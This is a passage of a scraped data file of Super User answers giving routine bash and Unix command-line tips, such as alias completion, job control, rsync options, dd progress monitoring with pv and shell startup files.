</code>, <code>""</code>, <code>'</code>, <code>""</code>, <code>$TR_TORRENT_NAME</code>, <code>""</code>, <code>'</code>, <code>""</code>]"
137,https://superuser.com/questions436314/,"['The following code, adapted from this Stack Overflow answer and this Ubuntu Forums discussion thread will add completions for all your defined aliases:', 'For simple (command only, no arguments) aliases it will assign the original completion function to the alias; for aliases with arguments, it creates a wrapper function that inserts the extra arguments into the original completion function.', 'Unlike the scripts it has evolved from, the function respects quotes both for the alias command and its arguments (but the former have to be matched by the completion command, and cannot be nested), and it should reliably filter out aliases to command lists and pipes (which are skipped, as it is impossible to find out what to complete in them without re-creating the complete shell command line parsing logic).', 'Either save the code as a shell script file and source that in, or copy the function wholesale into, .bashrc (or your pertinent dot file). The important thing is to call the function after both bash completion and alias definitions have been set up (the code above calls the function right after its definition, in a “source and forget” spirit, but you can move the call anywhere downstream if that suits you better). If you don’t want the function in your environment after it exits, you can add unset -f alias_completion after calling it.', 'If you are using bash 4.1 or above and use dynamically-loaded completions, the script will attempt to load completions for all of your aliased commands so that it can build the wrapper functions for your aliases.']","[<code># Automatically add completion for all aliases to commands having completion functions
function alias_completion {
    local namespace=""alias_completion""

    # parse function based completion definitions, where capture group 2 =&gt; function and 3 =&gt; trigger
    local compl_regex='complete( +[^ ]+)* -F ([^ ]+) (""[^""]+""|[^ ]+)'
    # parse alias definitions, where capture group 1 =&gt; trigger, 2 =&gt; command, 3 =&gt; command arguments
    local alias_regex=""alias ([^=]+)='(\""[^\""]+\""|[^ ]+)(( +[^ ]+)*)'""

    # create array of function completion triggers, keeping multi-word triggers together
    eval ""local completions=($(complete -p | sed -Ene ""/$compl_regex/s//'\3'/p""))""
    (( ${#completions[@]} == 0 )) &amp;&amp; return 0

    # create temporary file for wrapper functions and completions
    rm -f ""/tmp/${namespace}-*.tmp"" # preliminary cleanup
    local tmp_file; tmp_file=""$(mktemp ""/tmp/${namespace}-${RANDOM}XXX.tmp"")"" || return 1

    local completion_loader; completion_loader=""$(complete -p -D 2&gt;/dev/null | sed -Ene 's/.* -F ([^ ]*).*/\1/p')""

    # read in ""&lt;alias&gt; '&lt;aliased command&gt;' '&lt;command args&gt;'"" lines from defined aliases
    local line; while read line; do
        eval ""local alias_tokens; alias_tokens=($line)"" 2&gt;/dev/null || continue # some alias arg patterns cause an eval parse error
        local alias_name=""${alias_tokens[0]}"" alias_cmd=""${alias_tokens[1]}"" alias_args=""${alias_tokens[2]# }""

        # skip aliases to pipes, boolean control structures and other command lists
        # (leveraging that eval errs out if $alias_args contains unquoted shell metacharacters)
        eval ""local alias_arg_words; alias_arg_words=($alias_args)"" 2&gt;/dev/null || continue
        # avoid expanding wildcards
        read -a alias_arg_words &lt;&lt;&lt; ""$alias_args""

        # skip alias if there is no completion function triggered by the aliased command
        if [[ ! "" ${completions[*]} "" =~ "" $alias_cmd "" ]]; then
            if [[ -n ""$completion_loader"" ]]; then
                # force loading of completions for the aliased command
                eval ""$completion_loader $alias_cmd""
                # 124 means completion loader was successful
                [[ $? -eq 124 ]] || continue
                completions+=($alias_cmd)
            else
                continue
            fi
        fi
        local new_completion=""$(complete -p ""$alias_cmd"")""

        # create a wrapper inserting the alias arguments if any
        if [[ -n $alias_args ]]; then
            local compl_func=""${new_completion/#* -F /}""; compl_func=""${compl_func%% *}""
            # avoid recursive call loops by ignoring our own functions
            if [[ ""${compl_func#_$namespace::}"" == $compl_func ]]; then
                local compl_wrapper=""_${namespace}::${alias_name}""
                    echo ""function $compl_wrapper {
                        (( COMP_CWORD += ${#alias_arg_words[@]} ))
                        COMP_WORDS=($alias_cmd $alias_args \${COMP_WORDS[@]:1})
                        (( COMP_POINT -= \${#COMP_LINE} ))
                        COMP_LINE=\${COMP_LINE/$alias_name/$alias_cmd $alias_args}
                        (( COMP_POINT += \${#COMP_LINE} ))
                        $compl_func
                    }"" &gt;&gt; ""$tmp_file""
                    new_completion=""${new_completion/ -F $compl_func / -F $compl_wrapper }""
            fi
        fi

        # replace completion trigger by alias
        new_completion=""${new_completion% *} $alias_name""
        echo ""$new_completion"" &gt;&gt; ""$tmp_file""
    done &lt; &lt;(alias -p | sed -Ene ""s/$alias_regex/\1 '\2' '\3'/p"")
    source ""$tmp_file"" &amp;&amp; rm -f ""$tmp_file""
}; alias_completion
</code>, <code>.bashrc</code>, <code>unset -f alias_completion</code>, <code>bash</code>]"
138,https://superuser.com/questions559211/,"['From man bash:', 'In output pertaining to jobs (e.g., the output of the jobs command), the current job is always flagged with a +, and the previous job with a -.', 'That is, the job flagged with a + is the one that was sent to the background last. ', 'It is also the one that will be brought into the foreground when fg is used without arguments:', 'The job flagged with a - was sent to the background second last. Other background jobs are not flagged.']","[<code>man bash</code>, <code>jobs</code>, <code>+</code>, <code>-</code>, <code>+</code>, <code>fg</code>, <code>$ /tmp/script &amp;
[1] 9871
$ /tmp/script2 &amp;
[2] 9876
$ /tmp/script3 &amp;
[3] 9881
$ /tmp/script4 &amp;
[4] 9886
$ jobs
[1]   Running                 /tmp/script &amp;
[2]   Running                 /tmp/script2 &amp;
[3]-  Running                 /tmp/script3 &amp;
[4]+  Running                 /tmp/script4 &amp;
$ fg
/tmp/script4
</code>, <code>-</code>]"
139,https://superuser.com/questions730654/,"['By default, rsync does not delete files but that depends on the commands options you specify. You can use any the following if you WANT to delete files:', ""Since you specifically called out the -a option, here's what the man page says"", '−a, −−archive\n  >', 'This is equivalent to −rlptgoD. It is a quick way of saying you want recursion and want to preserve almost everything (with −H being a notable omission). The only exception to the above equivalence is when −−files−from is specified, in which case −r is not implied.', 'Note that −a does not preserve hardlinks, because finding multiply-linked files is expensive. You must separately specify −H.', ""So it seems the answer to your question is NO, it won't be deleted given your examples.\nHTH""]",[]
140,https://superuser.com/questions10201/,[],"[<code>awk '{printf ""%d\t%s\n"", NR, $0}' &lt; filename
</code>]"
141,https://superuser.com/questions479197/,"['Specify the units - I seem to remember having a problem when I omitted this option (although DPI should be the default), for example:', 'Do you know which embedded data fields GIMP uses to read the resolution - does it have its own that override the standard ones used by ImageMagick? For example, Photoshop uses Photoshop:XResolution and Photoshop:YResolution so you have to set these for Photoshop to recognise a density setting (ImageMagick can’t do this - we use ExifTool).']","[<code>convert -units PixelsPerInch input.png -density 300 output.png
</code>, <code>Photoshop:XResolution</code>, <code>Photoshop:YResolution</code>]"
142,https://superuser.com/questions965870/,"['It is a short cut way of saying:', 'This means you can be sure that file exists and it is empty.', 'You can also use > file but :> file is more portable.', ""See the Stack Overflow question What Is the Purpose of the ':' (colon) GNU Bash Builtin? for more information.""]","[<code>:&gt; file
</code>, <code>file</code>, <code>0</code>, <code>file</code>, <code>&gt; file</code>, <code>:&gt; file</code>]"
143,https://superuser.com/questions757834/,"[""Use grep's --include option:""]","[<code>grep</code>, <code>--include</code>, <code>grep -ir ""string"" --include=""*.php"" .
</code>]"
144,https://superuser.com/questions131019/,"['Try using pkill(1).', 'pkill chrome']",[<code>pkill chrome</code>]
145,https://superuser.com/questions609362/,"[""The pretty much ultimate solution when it comes to files that can't be deleted by normal means:"", 'The first column will show the inode number of the files.', 'This will delete the file with the specified inode-number after verification.']","[<code>ls -il 
</code>, <code>find . -inum [inode-number] -exec rm -i {} \;
</code>]"
146,https://superuser.com/questions288438/,"['bash-completion adds completion for:', 'And so on. You can print a list of completion commands with complete -p and see the source of a function with declare -f.', 'First, you have to install Homebrew or MacPorts according to the instructions. Note: Do not install both, as they conflict.', ""Then, install a newer version of Bash. The built-in Bash in OS X is a little old, and you'll get more completion options with Bash > 4.1, which you can get through"", 'or', 'depending on whether you use Homebrew or MacPorts.', 'To install bash-completion, you have to:', 'And add the following to your ~/.bash_profile:', 'Homebrew currently installs an older version of bash-completion (1.3) that still works with Bash 3.x, but still, using Bash 4.x is recommended.', 'With MacPorts:', 'Then, add to your ~/.bash_profile:', 'See trac.macports.org/wiki/howto/bash-completion for instructions on how to enable completion for port names.']","[<code>sudo</code>, <code>which</code>, <code>known_hosts</code>, <code>ssh</code>, <code>CDPATH</code>, <code>complete -p</code>, <code>declare -f</code>, <code>brew install bash
</code>, <code>sudo port install bash
</code>, <code>bash-completion</code>, <code>brew install bash-completion
</code>, <code>~/.bash_profile</code>, <code>if [ -f $(brew --prefix)/etc/bash_completion ]; then
  . $(brew --prefix)/etc/bash_completion
fi
</code>, <code>sudo port install bash-completion
</code>, <code>~/.bash_profile</code>, <code>if [ -f /opt/local/etc/profile.d/bash_completion.sh ]; then
  . /opt/local/etc/profile.d/bash_completion.sh
fi
</code>]"
147,https://superuser.com/questions271626/,"['Enable the mark-symlinked-directories option for readline.', 'Edit ~/.inputrc:', 'Press C-x, C-r to reload the settings.', 'See section READLINE in the manual page of bash for further documentation.', 'For those who do not wish to add another dot file, you can also add this line to your ~/.bashrc:']","[<code>mark-symlinked-directories</code>, <code>~/.inputrc</code>, <code>$include /etc/inputrc
set mark-symlinked-directories on
</code>, <code>bash</code>, <code>~/.bashrc</code>, <code>bind 'set mark-symlinked-directories on'
</code>]"
148,https://superuser.com/questions510337/,"['Most GNU/Linux commands allow a -- option to indicate end of options so that subsequent - prefixed words are not treated as options.', 'A small test']","[<code>--</code>, <code>-</code>, <code>  mv -- -example-file-name example-file-name
</code>, <code>$ touch -- -example
$ ls -l -- *ample
-rw-r--r-- 1 rgb rgb 0 Nov 25 09:57 -example
$ mv -- -example example
$
</code>]"
149,https://superuser.com/questions154936/,"['option 1:', 'option 2:', 'option 3:']","[<code>% echo -e ""text\n"" &gt;&gt; file.conf
</code>, <code>% ( echo text ; echo """" ) &gt;&gt; file.conf
</code>, <code>% echo text &gt;&gt; file.conf
% echo """"  &gt;&gt; file.conf
</code>]"
150,https://superuser.com/questions121627/,"['no spaces between equal sign', ""Some other ways, although not as efficient as using shell's internals""]","[<code>$ List=""abcd 1234 jvm something""
$ set -- $List
$ echo $2
1234
</code>, <code>$ echo $List | cut -d"" "" -f2
1234
$  echo $List | awk '{print $2}'
1234
$ echo $List | sed 's/^.[^ \t]* //;s/ .*//'
1234
$ echo $List | tr "" "" ""\n""|sed -n '2p'
1234
</code>]"
151,https://superuser.com/questions142680/,"['The problem with Control-Shift-A is that most terminal emulation programs do not send a different code for it from the one sent by Control-A, so there would be no way for screen to tell the difference.', 'You might be able to use C-q if you do stty -ixon to disable “software flow control” on the tty. I usually do this so I can use C-s to search on the command line.', 'You might consider C-^, since it seems to be usually unbound. It is Control-Shift-6 on US keyboard layouts, but it may be difficult to type on other layouts.', 'Most people never use the tty control character C-\\ to send SIGQUIT. To use it, disable the tty functionality with with stty quit undef and bind it as your prefix key. This is a bit risky though, since if you hit C-\\ on a tty where the quit key has not been disabled with stty, you might kill the foreground process instead of activating screen.', ""I switched to tmux a while ago. Its default is C-b because it was developed under screen and did not interfere with screen's default. I have found that C-b works fairly well for me (I usually use the arrow keys for single character movement on the shell command line—though I use M-b and M-f to move by words)."", 'Incidentally, the author of tmux uses C-a in his primary sessions and always types C-a twice (whether in a tmux session or not). If you are willing to adopt this habit, it seems like a decent compromise since the second C-a should be a no-op in most Emacs-like editing contexts. It would not work so will if you often use programs/contexts outside of screen where the second C-a would not be a no-op.', 'By default, C-a C-a is bound to the other command (switch to most recently active screen) in screen. To have C-a C-a send an actual C-a and have C-a o switch windows, put the following in your .screenrc:']","[<code>stty -ixon</code>, <code>stty quit undef</code>, <code>.screenrc</code>, <code>escape ^A^A
bind o other
</code>]"
152,https://superuser.com/questions867904/,"['!$ expands to the last word of your previous command.', 'So you could do:', 'or:', 'Your examples happened to only repeat the last word, so !$ worked fine. If you actually had a lot of arguments that you wanted to repeat, and you just wanted to change the first word, you could use !*, which expands to all words of the previous command except the zeroth. ', 'See the ""HISTORY EXPANSION"" section of the bash man page. There\'s a lot of flexibility there.']","[<code>!$</code>, <code>cat foo/is/a/very/long/path/to/bar.c

rm !$
</code>, <code>git diff foo/bar.c

git checkout !$
</code>, <code>!$</code>, <code>!*</code>, <code>bash</code>]"
153,https://superuser.com/questions144772/,['To get the function definition:'],"[<code>type -a function_name
</code>]"
154,https://superuser.com/questions344877/,"['Your expectations are based upon DOS Think/Windows Think and are wrong.  On MS-DOS, Windows, and indeed a few other IBM/Microsoft operating systems, wildcard expansion is done by the command itself, and things like the /a option to the dir command act as attribute filters during wildcard expansion.  dir expands wildcards like *, which the command interpreter passes to it as-is, and if /a is specified it applies the appropriate filters to what is returned.  (On some operating systems, the attribute filters can be given to the system call for enumerating a directory and the operating system kernel, or its filesystem drivers, applies them itself.)', 'On Unices and on Linux, wildcard expansion is done by the shell, and is oblivious to permissions.  When, in the root directory, you do ls *what the ls command itself receives from the shell is (something like) ls bin home opt var boot dev tmp etc lost+found root usrWhat the -d/--directory option does is turn off what normally happens next.  What normally happens next is that ls looks at each of its arguments in turn, sees that they are directories, and decides to enumerate their contents.  For arguments that name files, it just prints out the information for the file itself.  With the -d option, directories are treated just like files.  So ls prints out the information for each of the directories that is passed as its arguments, just as it would do if they were files.\nSo -d is not a ""print only directories"" option.  In fact, not only is there no such option; there cannot be such an option.  Wildcard expansion is done by the shell, and (in a POSIX sh at least) there\'s no way to tell the shell to check permission and file type bits when it expands * into a list of names.  To obtain a list of the names of directories alone, it is necessary either to use the find command, as explained by ztank1013, or to use the trick that a pathname ending with a slash implies the directory entry ., as explained by Jin.  (Jin\'s trick ends up with the ls command receiving the arguments  ls bin/ home/ opt/ var/ boot/ dev/ tmp/ etc/ lost+found/ root/ usr/because the pattern */ is in fact matching pathnames with two components, the second being empty, and so isn\'t quite doing what was desired.  In particular, it will treat symbolic links pointing to directories as if they were directories.)\nThe behaviour of ls -d without a * is a simple extension of the above.  One simply has to know one more thing about ls: When it is given no arguments, it assumes a default argument of ..  Now without the -d option, the aforementioned behaviour leads to the contents of the directory named by . being enumerated and the information for its contents displayed.  With the -d option, the directory . is treated just as if it were a file, and its own information is displayed, rather than its contents enumerated.\n', 'what the ls command itself receives from the shell is (something like) ls bin home opt var boot dev tmp etc lost+found root usrWhat the -d/--directory option does is turn off what normally happens next.  What normally happens next is that ls looks at each of its arguments in turn, sees that they are directories, and decides to enumerate their contents.  For arguments that name files, it just prints out the information for the file itself.  With the -d option, directories are treated just like files.  So ls prints out the information for each of the directories that is passed as its arguments, just as it would do if they were files.\nSo -d is not a ""print only directories"" option.  In fact, not only is there no such option; there cannot be such an option.  Wildcard expansion is done by the shell, and (in a POSIX sh at least) there\'s no way to tell the shell to check permission and file type bits when it expands * into a list of names.  To obtain a list of the names of directories alone, it is necessary either to use the find command, as explained by ztank1013, or to use the trick that a pathname ending with a slash implies the directory entry ., as explained by Jin.  (Jin\'s trick ends up with the ls command receiving the arguments  ls bin/ home/ opt/ var/ boot/ dev/ tmp/ etc/ lost+found/ root/ usr/because the pattern */ is in fact matching pathnames with two components, the second being empty, and so isn\'t quite doing what was desired.  In particular, it will treat symbolic links pointing to directories as if they were directories.)\nThe behaviour of ls -d without a * is a simple extension of the above.  One simply has to know one more thing about ls: When it is given no arguments, it assumes a default argument of ..  Now without the -d option, the aforementioned behaviour leads to the contents of the directory named by . being enumerated and the information for its contents displayed.  With the -d option, the directory . is treated just as if it were a file, and its own information is displayed, rather than its contents enumerated.\n', 'What the -d/--directory option does is turn off what normally happens next.  What normally happens next is that ls looks at each of its arguments in turn, sees that they are directories, and decides to enumerate their contents.  For arguments that name files, it just prints out the information for the file itself.  With the -d option, directories are treated just like files.  So ls prints out the information for each of the directories that is passed as its arguments, just as it would do if they were files.', 'So -d is not a ""print only directories"" option.  In fact, not only is there no such option; there cannot be such an option.  Wildcard expansion is done by the shell, and (in a POSIX sh at least) there\'s no way to tell the shell to check permission and file type bits when it expands * into a list of names.  To obtain a list of the names of directories alone, it is necessary either to use the find command, as explained by ztank1013, or to use the trick that a pathname ending with a slash implies the directory entry ., as explained by Jin.  (Jin\'s trick ends up with the ls command receiving the arguments  ls bin/ home/ opt/ var/ boot/ dev/ tmp/ etc/ lost+found/ root/ usr/because the pattern */ is in fact matching pathnames with two components, the second being empty, and so isn\'t quite doing what was desired.  In particular, it will treat symbolic links pointing to directories as if they were directories.)\nThe behaviour of ls -d without a * is a simple extension of the above.  One simply has to know one more thing about ls: When it is given no arguments, it assumes a default argument of ..  Now without the -d option, the aforementioned behaviour leads to the contents of the directory named by . being enumerated and the information for its contents displayed.  With the -d option, the directory . is treated just as if it were a file, and its own information is displayed, rather than its contents enumerated.\n', ""because the pattern */ is in fact matching pathnames with two components, the second being empty, and so isn't quite doing what was desired.  In particular, it will treat symbolic links pointing to directories as if they were directories.)"", 'The behaviour of ls -d without a * is a simple extension of the above.  One simply has to know one more thing about ls: When it is given no arguments, it assumes a default argument of ..  Now without the -d option, the aforementioned behaviour leads to the contents of the directory named by . being enumerated and the information for its contents displayed.  With the -d option, the directory . is treated just as if it were a file, and its own information is displayed, rather than its contents enumerated.']","[<code>/a</code>, <code>dir</code>, <code>dir</code>, <code>*</code>, <code>/a</code>, <code>ls</code>, <code>-d</code>, <code>--directory</code>, <code>ls</code>, <code>-d</code>, <code>ls</code>, <code>-d</code>, <code>sh</code>, <code>*</code>, <code>find</code>, <code>ztank1013</code>, <code>.</code>, <code>Jin</code>, <code>Jin</code>, <code>ls</code>, <code>*/</code>, <code>ls -d</code>, <code>*</code>, <code>ls</code>, <code>.</code>, <code>-d</code>, <code>.</code>, <code>-d</code>, <code>.</code>]"
155,https://superuser.com/questions940498/,"['If the the ""exit immediately shell option"" applies or is ignored depends on the context of the executed command (see Bash Reference Manual section on the Set Builtin - thanks to Arkadiusz Drabczyk).', 'Especially, the option is ignored if a command is part of the test in an if statement. Therefore it is possible to execute a command and check for its success or failure within an ""exit immediately context"" using an if statement like this:', 'It is possible to omit the ""then"" statement and use fewer lines:']","[<code>#!/bin/bash

set -e

# Uncomment next line to see set -e effect:
#blubb

if blubb; then
  echo ""Command blubb was succesful.""
else 
  echo ""Command blubb failed. Exit code: $?""
fi
echo ""Script exited normally.""
</code>, <code>if blubb; then :;
else echo ""Command blubb failed. Exit code: $?""; fi
</code>]"
156,https://superuser.com/questions591206/,"['This might helps others.', 'It looks like version 140310 of ConEmu automatically detects CygWin Bash.', ""If you've installed Cygwin after you installed ConEmu, you'll need to Reload... your list of Tasks."", 'You should now see {CygWin bash} as one of your options in the list of predefined tasks:', '', ""PS -- If this method doesn't work, try resetting your ConEmu settings (click the Reset... button at the bottom of your Settings window).""]",[]
157,https://superuser.com/questions1114549/,"['The problem is not specific to bash on Ubuntu for Windows, as the terminal is still provided by conhost.exe.', 'To change the colors, you can go into the Defaults:', '', 'And then you can click each individual color and change it to some other color.', '', ""The process is somewhat confusing, because by clicking a color rectangle, you're changing what is selected as the Screen Background. So you first have to change that selection, adjust the color and then change the selection back to your desired background color."", 'Overall, it is easier to just go with a different terminal or console emulator altogether. I personally use ConEmu now, which allows you to change color schemes much easier.']",[<code>conhost.exe</code>]
158,https://superuser.com/questions191889/,"[""I'd use find dirname -not -empty -ls, assuming GNU find.""]",[<code>find dirname -not -empty -ls</code>]
159,https://superuser.com/questions1290499/,"['See answers from this question [1]', 'For example you can use pv before you start', 'Output [2]:', 'Notes:\nEspecially for large files you may want to see man dd and set the options needed to speed up all on your hardware, e.g. bs=100M to set the buffer, oflag=sync to count the effective bytes written, maybe direct...\nThe option -s only takes integer parameters so 1.8T-->1844G.\nAs you can notice from the first lines you do not need dd at all.\n', 'If you already launched the dd command, once you have individuated its PID (Ctrl-Z +bg and you read it , or pgrep ^dd ... ) you may send a signal USR1 (or SIGUSR1, or SIGINFO see below) and read the output.\nIf the PID of the program is 1234 with', 'dd will answer on the terminal of its STDERR with something similar to', 'Warning: Under OpenBSD you may have to check in advance the behaviour of kill[3]: use instead\nkill -SIGINFO 1234.\nIt exists the sigaction named SIGINFO. TheSIGUSR1 one, in this case, should terminate the program (dd)...\nUnder Ubuntu use -SIGUSR1 (10).\n']","[<code>pv</code>, <code>pv</code>, <code>sudo apt-get install pv    # if you do not have it
pv &lt; /dev/sda &gt; /dev/sc3   # it is reported to be faster
pv /dev/sda &gt; /dev/sc3     # it seems to have the same speed of the previous one
#or 
sudo dd if=/dev/sda | pv -s 1844G | dd of=/dev/sdc3  # Maybe slower 
</code>, <code>440MB 0:00:38 [11.6MB/s] [======&gt;                             ] 21% ETA 0:02:19
</code>, <code>man dd</code>, <code>bs=100M</code>, <code>oflag=sync</code>, <code>direct</code>, <code>-s</code>, <code>1.8T--&gt;1844G</code>, <code>dd</code>, <code>kill -USR1 pid</code>, <code>dd</code>, <code>bg</code>, <code>pgrep ^dd</code>, <code>USR1</code>, <code>SIGUSR1</code>, <code>SIGINFO</code>, <code>kill -USR1 1234
</code>, <code>dd</code>, <code>4+1 records in
4+0 records out
41943040 bytes (42 MB) copied, 2.90588 s, 14.4 MB/s
</code>, <code>kill</code>, <code>kill -SIGINFO 1234</code>, <code>SIGINFO</code>, <code>SIGUSR1</code>, <code>dd</code>, <code>-SIGUSR1</code>, <code>10</code>]"
160,https://superuser.com/questions271530/,"['Create a file named .inputrc in your home directory, and place this line in it:', ""Then open a new shell and try it out. If /etc/inputrc exists on your system, you should generally also add the line $include /etc/inputrc. But there's no way to make this conditional, so you should only add it if that file exists.""]","[<code>.inputrc</code>, <code>set completion-ignore-case on
</code>, <code>$include /etc/inputrc</code>]"
161,https://superuser.com/questions409186/,"['On a modern system it is not especially common to run into the cases where it matters, but it does happen.  (In particular, if you use shell operations in vim such as :r !command or the in-line !<motion>command form.)', 'What would you put under ~/.bashrc? only aliases?', ""You put things in ~/.bashrc that would not be inherited by subshells automatically; this means aliases and functions, mostly, although sometimes you have variable settings that you don't want visible outside the shell (this is very rare).  It could be argued that those should be exported somehow, but various experimental attempts have run into compatibility issues with trying to hide them within the environment and have mostly been abandoned."", 'If I want to set an environment variable and add it to the PATH (for example JAVA_HOME) where it would be the best place to put the export entry? in ~/.bash_profile or ~/.bashrc?', ""You put environment settings in ~/.bash_profile so that they are given sane initial settings.  Sometimes you will want to override these (often this is done by complex environments such as Matlab or Cadence); if you put the environment settings in ~/.bashrc then shells run from within those environments will lose the environments' customizations, and things may not work properly as a result.  This also applies if you use a package like modules, virtualenv, rvm, etc. to manage multiple development environments; putting your settings in ~/.bashrc means you can't run the environment you want from within your editor, but instead will be forced into the system default."", 'In a non-login shell, I believe the ~/.bash_profile is not being ""picked up"".', ""This is correct; you normally want the initial shell to be a login shell and any shells started under that one to not be login shells.  If the initial shell is not a login shell, you won't have a default PATH or various other settings (including your JAVA_HOME example)."", 'Most desktop environments launched from display managers (which is to say, the vast majority of graphical logins) do not set up a login environment for the entire desktop, so you are forced to run the initial shell in terminals as a login shell.  This causes a number of problems (notably that the PATH and such available to programs run from e.g. panels is not set up properly, because the panel is not a terminal and has not run ~/.bash_profile), but is a reasonable compromise given that it is not always possible to sanely run ~/.bash_profile in the non-interactive environment at the beginning of a session started by a display manager, depending on its contents.  It is sometimes suggested to place environment settings in ~/.bashrc instead of configuring a login shell instead; as discussed above, this works as long as you do not need to override that environment, and causes odd breakages once you do need to do so.', 'I recently helped diagnose an issue like this on OS X where a user who had placed settings in ~/.bashrc then later started using rvm and perlbrew saw odd behavior, because the environments set up by the two were ""undone"" by ~/.bashrc inside editors and sudo (which on OS X, unlike Linux, propagates the user\'s $HOME so that their ~/.bashrc was run by the root shell).  Before trying to use those environments, there was no problem; on starting to use them, they were bewildered by the unexpected loss of their settings.']","[<code>vim</code>, <code>:r !command</code>, <code>!&lt;motion&gt;command</code>, <code>~/.bashrc</code>, <code>~/.bash_profile</code>, <code>~/.bashrc</code>, <code>~/.bashrc</code>, <code>PATH</code>, <code>JAVA_HOME</code>, <code>PATH</code>, <code>~/.bash_profile</code>, <code>~/.bash_profile</code>, <code>~/.bashrc</code>, <code>~/.bashrc</code>, <code>rvm</code>, <code>~/.bashrc</code>, <code>sudo</code>, <code>$HOME</code>, <code>~/.bashrc</code>]"
162,https://superuser.com/questions276487/,"['From any directory:', 'du -a | sort -n -r']",[<code>du -a | sort -n -r</code>]
163,https://superuser.com/questions1073869/,"['The simplest way is to use a shell function:', 'Place it in your .bashrc file to make it be available to you just like another shell command.', ""The reason why it doesn't work as an external script is cd changes the current directory of the running script but doesn't affect the calling one. This is by design! Each process has its own working directory which is inherited by its children, but the opposite is not possible."", ""Unless part of a pipeline, run in the background or explicitly in a subshell, a shell function doesn't run in a separate process but in the same one, just like if the command has been sourced. The current directory shell can then be changed by a function."", ""The && used here to separate both commands used means, if the first command succeeds (mkdir), run the second one (cd). Consequently, if mkdir fails to create the requested directory, there is no point trying to go into it. An error message is printed by mkdir and that's it."", ""The -p option used with mkdir is there to tell this utility to create any missing directory that is part of the full path of the directory name passed as argument. One side effect is that if you ask to create an already existing directory, the mkcd function won't fail and you'll end up in that directory. That might be considered an issue or a feature. In the former case, the function can be modified for example that way which simply warns the user:"", 'Without the -p option, the behavior of the initial function would have been very different.', ""If the directory containing the directory to create doesn't already exists, mkdir fails an so does the function."", ""If the directory to be create already exists, mkdir fails too and cd isn't called."", 'Finally, note that setting/exporting PWD is pointless, as the shell already does it internally.', 'Edit: I added the -- option to both commands for the function to allow a directory name starting with a dash.']","[<code>mkcd() {
    mkdir -p -- ""$1"" &amp;&amp; cd -- ""$1""
}
</code>, <code>.bashrc</code>, <code>cd</code>, <code>&amp;&amp;</code>, <code>mkdir</code>, <code>cd</code>, <code>mkdir</code>, <code>mkdir</code>, <code>-p</code>, <code>mkdir</code>, <code>mkcd</code>, <code>mkcd() {
    if [ -d ""$1"" ]; then
        printf ""mkcd: warning, \""%s\"" already exists\n"" ""$1""
    else
        mkdir -p ""$1"" 
    fi &amp;&amp; cd ""$1""
}
</code>, <code>-p</code>, <code>mkdir</code>, <code>mkdir</code>, <code>cd</code>, <code>PWD</code>, <code>--</code>]"
164,https://superuser.com/questions298081/,"['Using bash history expansion:', 'where !#:1:h means: from the line you\'re currently typing (""!#""), take the first word ("":1""), then take only the path component ("":h"" -- the head) from it.']","[<code>mv path/to/oldfile !#:1:h/newfile
</code>, <code>!#:1:h</code>]"
165,https://superuser.com/questions105367/,"['In addition to what you said, su requires the root password and sudo requires your user password', 'Therefore sudo su - will put you into a root environment but it will ask you for your user password instead of the root password (once sudo has given you root privileges, su - can be executed with no password). ']","[<code>su</code>, <code>sudo</code>, <code>sudo su -</code>, <code>su -</code>]"
166,https://superuser.com/questions1204017/,"['If you\'r using zsh alias -g ,,="".."" is what you need, but this will cause "",,"" to be expanded everywhere, not only when used with cd.', 'From man zshbuiltins:', 'If  the  -g  flag  is  present, define a global alias; global aliases are expanded even if they do not occur in command position.', 'If restricted to bash (as the question is tagged with bash), read the following:', 'This is a pure-alias solution, as requested, however this will do more than required possibly frustrating the user (see the warning at the end of my post).', 'Quoting man bash:', 'If the last character of the alias value is a blank, then the next command word following the alias is also checked for alias expansion.', ""Therefore it's enough to alias cd with an extra space (to allow expanding of its next argument) and then alias ,, to ... See that"", 'gives exactly what you need.', 'Note that this is correct not only for bash (and its alias implementation), but all POSIX-compilant shells. Quoting an example from man 1p alias (the manual does not describe this feature explicitly, only through an example):', 'Set up nohup so that it can deal with an argument that is itself an alias name:', 'Warning:\nAs @PeterCordes writes in his comment, it will automatically cause other aliases to expand when written after cd. It may require you to write cd \\grep if you want to change directory to one named grep but your grep is an alias for grep --color=auto. Without the backslash, cd will report ""too many arguments"" error (you can\'t cd to two directories at once)!.']","[<code>zsh</code>, <code>alias -g ,,=""..""</code>, <code>cd</code>, <code>man zshbuiltins</code>, <code>-g</code>, <code>bash</code>, <code>man bash</code>, <code>cd</code>, <code>,,</code>, <code>..</code>, <code>alias cd='cd '
alias ,,='..'
</code>, <code>bash</code>, <code>alias</code>, <code>man 1p alias</code>, <code>       alias nohup=""nohup ""
</code>, <code>cd</code>, <code>cd \grep</code>, <code>grep</code>, <code>grep</code>, <code>grep --color=auto</code>, <code>cd</code>, <code>cd</code>]"
167,https://superuser.com/questions312348/,['Try:'],"[<code>find src/ -type f | grep -i so$ | xargs -i cp {} dst
</code>]"
168,https://superuser.com/questions84998/,"['You can press Esc-dot many times, it does the same things are alt-dot.\nBut, like you, i find it more cumbersome to type to type than alt-dot.']",[]
169,https://superuser.com/questions554855/,"['Seeing ""Broken pipe"" in this situation is rare, but normal. ', 'When you run type rvm | head -1, bash executes type rvm in one process, head -1 in another.1 The stdout of type is connected to the ""write"" end of a pipe, the stdin of head to the ""read"" end. Both processes run at the same time.', 'The head -1 process reads data from stdin (usually in chunks of 8 kB), prints out a single line (according to the -1 option), and exits, causing the ""read"" end of the pipe to be closed. Since the rvm function is quite long (around 11 kB after being parsed and reconstructed by bash), this means that head exits while type still has a few kB of data to write out.', 'At this point, since type is trying to write to a pipe whose other end has been closed – a broken pipe – the write() function it caled will return an EPIPE error, translated as ""Broken pipe"". In addition to this error, the kernel also sends the SIGPIPE signal to type, which by default kills the process immediately.', '(The signal is very useful in interactive shells, since most users do not want the first process to keep running and trying to write to nowhere. Meanwhile, non-interactive services ignore SIGPIPE – it would not be good for a long-running daemon to die on such a simple error – so they find the error code very useful.)', 'However, signal delivery is not 100% immediate, and there may be cases where write() returns EPIPE and the process continues to run for a short while before receiving the signal. In this case, type gets enough time to notice the failed write, translate the error code and even print an error message to stderr before being killed by SIGPIPE. (The error message says ""-bash: type:"" since type is a built-in command of bash itself.)', ""This seems to be more common on multi-CPU systems, since the type process and the kernel's signal delivery code can run on different cores, literally at the same time."", ""It would be possible to remove this message by patching the type builtin (in bash's source code) to immediately exit when it receives an EPIPE from the write() function."", ""However, it's nothing to be concerned about, and it is not related to your rvm installation in any way.""]","[<code>type rvm | head -1</code>, <code>type rvm</code>, <code>head -1</code>, <code>type</code>, <code>head</code>, <code>head -1</code>, <code>-1</code>, <code>rvm</code>, 